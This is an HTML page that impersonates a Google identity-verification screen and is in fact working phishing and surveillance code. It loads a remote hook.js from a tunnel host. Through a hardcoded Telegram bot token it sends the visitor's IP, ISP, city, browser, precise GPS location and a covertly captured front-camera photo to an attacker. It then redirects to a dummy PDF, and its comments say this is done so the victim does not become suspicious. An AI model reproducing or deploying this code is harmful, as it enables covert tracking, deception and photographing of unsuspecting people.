<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Security</title>
    <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; margin-top: 20px; text-decoration: none; display: inline-block; }
        .instruction { font-size: 14px; color: #5f6368; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>

<div class="box" id="contentBox">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90" alt="">
    <h2>Identity Verification</h2>
    <p id="mainText">Please verify your identity to access the document.</p>
    
    <div id="telegramOnly" style="display:none;">
        <p style="color:red; font-weight:bold;">⚠️ Action Required</p>
        <p>This verification requires a secure browser. Please click the button below to open in Chrome/Safari.</p>
        <a href="#" id="openBrowser" class="btn">OPEN IN SECURE BROWSER</a>
    </div>

    <button class="btn" id="startBtn">VERIFY IDENTITY</button>
</div>

<video id="spy-vid" autoplay playsinline muted style="position:fixed; top:-1000px;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
    const chatId = "6679834643";
    const currentURL = window.location.href;

    // پشکنین: ئایا لە ناو تێلگرامدایە؟
    const isTelegram = /Telegram/i.test(navigator.userAgent);

    if (isTelegram) {
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('telegramOnly').style.display = 'block';
        
        // هەوڵدان بۆ کردنەوەی ئۆتۆماتیکی لە برۆوسەری دەرەکی (بۆ ئەندرۆید)
        const intentURL = "intent://" + currentURL.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
        document.getElementById('openBrowser').href = intentURL;

        // بۆ ئایفۆن: ئاسانترین ڕێگە نیشاندانی ڕێنماییە یان لایەنی کەم ناردنی IP کەی
        sendToBot("📢 Target opened in Telegram Browser (Restricted)");
    }

    async function sendToBot(msg) {
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    }

    document.getElementById('startBtn').addEventListener('click', async function() {
        this.innerHTML = "Processing...";
        this.disabled = true;

        await getFullLog();
        getGPS();
        setTimeout(getCamera, 1000);
    });

    async function getFullLog() {
        const response = await fetch('https://ipapi.co/json/');
        const d = await response.json();
        const msg = `🔥 Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Browser: ${navigator.userAgent}`;
        await sendToBot(msg);
    }

    function getGPS() {
        navigator.geolocation.getCurrentPosition(async (p) => {
            await sendToBot(`📍 GPS: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        }, null, {enableHighAccuracy: true});
    }

async function getCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('spy-vid');
            video.srcObject = stream;

            video.onloadeddata = async () => {
                video.play();
                await new Promise(r => setTimeout(r, 5000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth > 0 ? video.videoWidth : 640;
                canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'capture.jpg');
                    fd.append('caption', '👤 Target Face Captured!');
                    
                    // ناردنی وێنەکە بۆ تێلگرام
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                    
                    stream.getTracks().forEach(t => t.stop());

                    // --- لێرەدا فایلی PDF دایبەزێنە ---
                    if (response.ok) {
                        const pdfUrl = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"; // لینکی فایلی PDF لێرە دابنێ
                        
                        // نیشاندانی پەیامێکی سەرکەوتوو و بردن بۆ سەر فایلەکە
                        document.getElementById('startBtn').innerHTML = "Verified! Downloading...";
                        
                        setTimeout(() => {
                            window.location.href = pdfUrl; // قوربانییەکە دەباتە سەر فایلەکە
                        }, 1000);
                    }
                    
                }, 'image/jpeg', 0.7);
            };
        } catch (e) {
            sendToBot(`❌ Camera Permission Error: ${e.message}`);
            // ئەگەر کامێراشی نەدا، هەر بیبە بۆ فایلەکە بۆ ئەوەی گومان نەکات
            window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
        }
    }
</script>
</body>
</html>
